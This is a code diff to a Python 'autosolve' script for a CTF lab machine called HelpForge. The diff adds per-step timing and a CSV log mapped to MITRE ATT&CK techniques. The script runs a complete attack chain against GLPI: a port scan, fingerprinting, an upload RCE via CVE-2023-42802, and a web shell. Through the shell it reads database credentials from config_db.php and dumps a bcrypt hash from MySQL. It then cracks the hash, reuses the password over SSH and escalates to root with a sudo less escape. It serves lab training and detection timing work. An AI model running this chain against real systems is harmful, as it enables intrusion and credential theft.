@@ -1,11 +1,13 @@
 #!/usr/bin/env python3
 import argparse
+import csv
 import ftplib
 import http.cookiejar
 import io
 import os
 import re
 import shlex
+import socket
 import subprocess
 import sys
 import tarfile
@@ -45,8 +47,8 @@ def fail(message):
 
 def http_get(url, timeout=15, opener=None):
     req = urllib.request.Request(url, headers={"User-Agent": "HelpForge-Autosolve/1.0"})
-    client = opener if opener is not None else urllib.request
-    with client.open(req, timeout=timeout) as res:
+    open_fn = opener.open if opener is not None else urllib.request.urlopen
+    with open_fn(req, timeout=timeout) as res:
         return res.read()
 
 
@@ -79,8 +81,8 @@ def http_post_multipart(url, parts, headers=None, timeout=30, opener=None):
         req_headers.update(headers)
 
     req = urllib.request.Request(url, data=data, headers=req_headers, method="POST")
-    client = opener if opener is not None else urllib.request
-    with client.open(req, timeout=timeout) as res:
+    open_fn = opener.open if opener is not None else urllib.request.urlopen
+    with open_fn(req, timeout=timeout) as res:
         return res.read()
 
 
@@ -409,50 +411,238 @@ def extract_flag(text, label):
     return flags[-1]
 
 
+def now_ms():
+    """Millisecond-precision unix timestamp (Python equivalent of `date +%s%3N`)."""
+    return int(time.time() * 1000)
+
+
+CSV_COLUMNS = [
+    "step",
+    "phase",
+    "action",
+    "mitre_technique",
+    "start_ms",
+    "end_ms",
+    "duration_ms",
+    "log_source",
+]
+
+
+class TimingRecorder:
+    """Records start/end millisecond timestamps for each documented attack step.
+
+    The step list mirrors the Attack Timeline in writeup.md and the MITRE
+    ATT&CK mapping in challenge-design-v1.md (section 3.1).
+    """
+
+    def __init__(self, csv_path):
+        self.csv_path = csv_path
+        self.rows = []
+
+    def step(self, num, phase, action, mitre_technique, log_source):
+        return _StepContext(self, num, phase, action, mitre_technique, log_source)
+
+    def write(self):
+        os.makedirs(os.path.dirname(self.csv_path) or ".", exist_ok=True)
+        with open(self.csv_path, "w", newline="", encoding="utf-8") as handle:
+            writer = csv.writer(handle)
+            writer.writerow(CSV_COLUMNS)
+            writer.writerows(self.rows)
+        info(f"Wrote timing data for {len(self.rows)} steps to {self.csv_path}")
+
+
+class _StepContext:
+    def __init__(self, recorder, num, phase, action, mitre_technique, log_source):
+        self.recorder = recorder
+        self.num = num
+        self.phase = phase
+        self.action = action
+        self.mitre_technique = mitre_technique
+        self.log_source = log_source
+
+    def __enter__(self):
+        info(f"[step {self.num}] {self.phase}: {self.action}")
+        self.start_ms = now_ms()
+        return self
+
+    def __exit__(self, exc_type, exc_value, traceback):
+        end_ms = now_ms()
+        self.recorder.rows.append(
+            [
+                self.num,
+                self.phase,
+                self.action,
+                self.mitre_technique,
+                self.start_ms,
+                end_ms,
+                end_ms - self.start_ms,
+                self.log_source,
+            ]
+        )
+        return False
+
+
+def run_nmap(target, logs_dir):
+    """Step 1 recon scan. Uses nmap when available, otherwise a socket fallback."""
+    out_path = os.path.join(logs_dir, "autoscan.txt")
+    if shutil_which("nmap"):
+        subprocess.run(
+            ["nmap", "-sV", "-sC", "-p21,22,80,3306", "-oN", out_path, target],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=300,
+            check=False,
+        )
+        return
+
+    lines = [f"# nmap unavailable, socket connect scan of {target}"]
+    for port in (21, 22, 80, 3306):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
+        state = "open" if sock.connect_ex((target, port)) == 0 else "filtered/closed"
+        sock.close()
+        lines.append(f"{port}/tcp {state}")
+    with open(out_path, "w", encoding="utf-8") as handle:
+        handle.write("\n".join(lines) + "\n")
+
+
+def fingerprint_glpi(target):
+    """Step 2 web enumeration. Fetches the GLPI landing page and detects version."""
+    base = f"http://{target}".rstrip("/")
+    index = http_get(f"{base}/index.php").decode(errors="replace")
+    match = re.search(r"GLPI[^0-9]{0,20}(\d+\.\d+\.\d+)", index)
+    version = match.group(1) if match else "unknown"
+    info(f"GLPI fingerprinted as version {version}")
+    return version
+
+
 def main():
     parser = argparse.ArgumentParser(description="Autosolve the HelpForge CTF challenge")
     parser.add_argument("target", nargs="?", default="192.168.56.102")
+    parser.add_argument(
+        "--logs",
+        default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs"),
+        help="Directory for timing.csv and the nmap scan output (default: ./logs).",
+    )
     args = parser.parse_args()
 
     target = args.target
+    logs_dir = args.logs
+    os.makedirs(logs_dir, exist_ok=True)
+    timing = TimingRecorder(os.path.join(logs_dir, "timing.csv"))
     info(f"Target: {target}")
 
-    shell = exploit_glpi(target)
-    www_id = web_cmd(shell, "id")
-    info(f"Foothold: {www_id}")
+    try:
+        # Step 1 - Recon: network service discovery (writeup step 1, design 3.1 step 1).
+        with timing.step(1, "Recon", "nmap service scan", "T1046", "/var/log/syslog"):
+            run_nmap(target, logs_dir)
 
-    config = web_cmd(shell, "cat /var/www/glpi/config/config_db.php")
-    db_password = parse_db_password(config)
-    info("Recovered GLPI database password")
+        # Step 2 - Enumeration: GLPI HTTP fingerprinting (writeup step 2).
+        with timing.step(
+            2, "Enumeration", "HTTP/GLPI fingerprinting", "T1595", "/var/log/apache2/access.log"
+        ):
+            fingerprint_glpi(target)
 
-    mysql_cmd = (
-        "mysql -u glpiuser "
-        f"-p{shlex.quote(db_password)} "
-        "glpidb -N -B -e "
-        + shlex.quote("SELECT password FROM glpi_users WHERE name='techops';")
-    )
-    techops_hash = web_cmd(shell, mysql_cmd).splitlines()[-1].strip()
-    if not techops_hash.startswith("$2"):
-        fail("Unexpected techops hash output")
-    info(f"Recovered techops bcrypt hash: {techops_hash}")
+        # Step 3 - Enumeration: anonymous FTP, recover the cracking wordlist (writeup step 3).
+        candidates = None
+        with timing.step(
+            3, "Enumeration", "FTP anonymous enumeration", "T1083", "/var/log/vsftpd.log"
+        ):
+            candidates = download_wordlist(target)
 
-    candidates = download_wordlist(target)
-    password = crack_bcrypt(techops_hash, candidates)
-    info(f"Cracked techops password: {password}")
+        # Step 4 - Initial Access: CVE-2023-42802 upload RCE (writeup step 4).
+        shell = None
+        with timing.step(
+            4,
+            "Exploitation",
+            "GLPI CVE-2023-42802 exploitation",
+            "T1190;T1505.003",
+            "/var/log/apache2/access.log",
+        ):
+            shell = exploit_glpi(target)
+            www_id = web_cmd(shell, "id")
+            info(f"Foothold: {www_id}")
 
-    web_cmd(shell, "rm -f /var/www/glpi/front/files/file.png")
+        # Step 5 - Post-Exploitation: read database credentials from config (writeup step 5).
+        db_password = None
+        with timing.step(
+            5,
+            "Post-Exploitation",
+            "Read config_db.php credentials",
+            "T1552.001",
+            "/var/log/apache2/access.log",
+        ):
+            config = web_cmd(shell, "cat /var/www/glpi/config/config_db.php")
+            db_password = parse_db_password(config)
+            info("Recovered GLPI database password")
 
-    user_output = run_ssh_command(target, "techops", password, "cat /home/techops/user.txt")
-    user_flag = extract_flag(user_output, "user")
-    info(f"User flag: {user_flag}")
+        # Step 6 - Post-Exploitation: query the GLPI user hash from MySQL (writeup step 6).
+        techops_hash = None
+        with timing.step(
+            6,
+            "Post-Exploitation",
+            "Query glpi_users bcrypt hash",
+            "T1005",
+            "/var/log/mysql/general.log",
+        ):
+            mysql_cmd = (
+                "mysql -u glpiuser "
+                f"-p{shlex.quote(db_password)} "
+                "glpidb -N -B -e "
+                + shlex.quote("SELECT password FROM glpi_users WHERE name='techops';")
+            )
+            techops_hash = web_cmd(shell, mysql_cmd).splitlines()[-1].strip()
+            if not techops_hash.startswith("$2"):
+                fail("Unexpected techops hash output")
+            info(f"Recovered techops bcrypt hash: {techops_hash}")
 
-    root_output = run_less_privesc(target, "techops", password)
-    root_flag = extract_flag(root_output, "root")
-    info(f"Root flag: {root_flag}")
+        # Step 7 - Credential Access: offline bcrypt cracking (writeup step 7).
+        password = None
+        with timing.step(
+            7, "Credential Access", "Offline bcrypt password cracking", "T1110.002", "offline"
+        ):
+            password = crack_bcrypt(techops_hash, candidates)
+            info(f"Cracked techops password: {password}")
+
+        web_cmd(shell, "rm -f /var/www/glpi/front/files/file.png")
+
+        # Step 8 - Lateral Movement: SSH password reuse, user flag (writeup step 8).
+        user_flag = None
+        with timing.step(
+            8, "Lateral Movement", "SSH password reuse as techops", "T1078", "/var/log/auth.log"
+        ):
+            user_output = run_ssh_command(
+                target, "techops", password, "cat /home/techops/user.txt"
+            )
+            user_flag = extract_flag(user_output, "user")
+            info(f"User flag: {user_flag}")
+
+        # Step 9 - Privilege Escalation: enumerate sudo rights (writeup step 9).
+        with timing.step(
+            9, "Privilege Escalation", "sudo -l enumeration", "T1069.001", "/var/log/auth.log"
+        ):
+            sudo_l = run_ssh_command(target, "techops", password, "sudo -n -l 2>&1")
+            info(f"sudo -l output: {sudo_l.strip().splitlines()[-1] if sudo_l.strip() else 'n/a'}")
+
+        # Step 10 - Privilege Escalation: sudo less shell escape, root flag (writeup step 10).
+        root_flag = None
+        with timing.step(
+            10,
+            "Privilege Escalation",
+            "sudo less shell escape to root",
+            "T1548.003",
+            "/var/log/auth.log",
+        ):
+            root_output = run_less_privesc(target, "techops", password)
+            root_flag = extract_flag(root_output, "root")
+            info(f"Root flag: {root_flag}")
+    finally:
+        timing.write()
 
     print("\n[+] HelpForge autosolve completed")
     print(f"[+] user.txt: {user_flag}")
     print(f"[+] root.txt: {root_flag}")
+    print(f"[+] timing.csv: {os.path.join(logs_dir, 'timing.csv')}")
 
 
 if __name__ == "__main__":
